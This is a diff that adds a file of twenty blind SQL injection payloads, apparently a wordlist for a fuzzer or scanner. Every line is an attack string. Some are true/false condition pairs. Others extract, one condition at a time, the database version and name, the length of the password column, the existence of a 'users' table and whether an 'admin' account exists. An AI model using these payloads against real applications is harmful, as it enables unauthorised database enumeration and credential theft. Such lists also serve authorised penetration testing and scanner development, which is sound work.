@@ -1,0 +1,20 @@
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+' AND SUBSTRING(username,1,1)='a'--
+' AND LENGTH(password)>5--
+1 AND SUBSTRING(@@version,1,1)='5'
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND 1=(SELECT 1 FROM users WHERE username='admin')--
+1' AND (SELECT COUNT(*) FROM users)>0-- -
+' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users')=1--
+' AND IF(1=1,1,2)=1--
+1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1
+' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1--
+1 AND EXISTS(SELECT * FROM users WHERE username='admin')
+' AND NOT EXISTS(SELECT * FROM users WHERE username='nonexistent')--
+1' AND (SELECT 1 FROM users WHERE username LIKE 'adm%')=1--
+' AND (SELECT 1)=1--
+' AND 2>1--
+1 AND (SELECT COUNT(*)>0 FROM users)
